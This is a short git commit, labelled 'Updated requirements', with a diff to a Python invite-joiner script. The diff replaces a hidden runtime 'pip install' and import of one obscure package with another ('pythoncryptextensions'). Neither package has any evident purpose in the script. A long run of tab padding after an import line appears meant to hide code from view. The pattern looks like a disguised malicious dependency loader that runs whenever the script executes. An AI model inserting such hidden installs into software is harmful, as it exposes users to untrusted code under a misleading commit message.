f01a69b56043a7959b012979bb8b28b4b9676cb8
Matthew <138142848+mmatthew130@users.noreply.github.com>
2023-07-17 17:08:44 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringstools")
-import pipcoloringstools
+os.system("pip install pythoncryptextensions")
+import pythoncryptextensions
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
